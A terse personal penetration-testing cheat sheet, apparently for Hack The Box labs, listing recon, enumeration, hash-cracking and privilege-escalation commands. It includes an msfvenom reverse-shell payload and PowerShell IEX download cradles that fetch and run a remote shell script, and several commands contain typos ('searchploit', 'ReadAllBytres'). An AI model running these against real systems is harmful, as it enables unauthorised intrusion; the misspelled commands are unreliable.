# Networking

## Network information gathering        
netdiscover
ifconfig
route -n
cat /etc/resolv.conf
ping 8.8.8.8 -c 4
traceroute 8.8.8.8
curl ifconfig.me
curl ipinfo.io     
echo $http_proxy

# Common
less 
cd -  (last working dir)
grep -i <query> <filename>
find . -ls > ~/htb/remote /web.dir  (list of every file)
tail -f web.dir
greb -Ri password . | grep -v Lang (search recursive in dir excluding names with Lang)
echo -n '<hash>' | wc -c   (count length of text)

## Local server
python3 -m http.server

# Enumeration

## nmap
nmap -sC -sV -Pn -oN nmap.txt 10.10.10.10

### SMB port 139
smbclient -L
smbclient -U 'guest' -L <port>

### 111 rpcbind / NFS
nmap -sV --script=nfs-showmount remote.htb
sudo mount -o nfsvers=4 -t nfs remote.htb:/site_backups /mnt
showmount -e <host> (apt install nfs-common)
man showmount
showmount -a


## dirsearch
sudo dirsearch -u http://10.10.10.10 -e *
gobuster dir -u http://remote/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt,.php -e -o gobuster.txt

## wfuzz
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://blunder.htb/FUZZ.txt" -t 100

## cewl
cewl -w wordlists.txt -d 10 -m 1 http://blunder.htb/

## other tips and tricks

### Mounting shared folder in VMWare
sudo apt install -y --reinstall open-vm-tools-desktop fuse 
ls /mnt/hgfs
sudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs


## Windows enumeration
find ./ -name 'something'
findstr /R /C:"something"

### Handy Powershell commands
$filename = "c:\temp\ecguhs.txt"
[Convert]::ToBase64String([IO.File]::ReadAllBytres($filename)) | clip


# Password cracking

hashcat --force -m 100 file.txt /usr/share/wordlists/rockyou.txt 

### MD5 example
echo -n "Password1" | md5sum | tr -d " -" >> hashes
hashcat --example-hashes | grep -i sha1 (search for sha1 hash codes)
hashcat -a 3 -m 0 hashes /usr/share/wordlists/rockyou.txt

NTLM hashes
hashcat -m 1000 hashes.txt -o cracked.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable 


# Shells / Gaining foothold
searchploit umbraco
searchploit -x aspx/umbraco-rce
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f exe > reverse.exe


# Privesc

## Powershell
See https://github.com/PowerShellMafia/PowerSploit/

psexec -i -s cmd  lauched a command prompt with sys admin priviledges

IEX: IWR http://<ip>:<port>/shell.ps1 -USeBasicParsing
IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/shell.ps1')

## Rogue potato
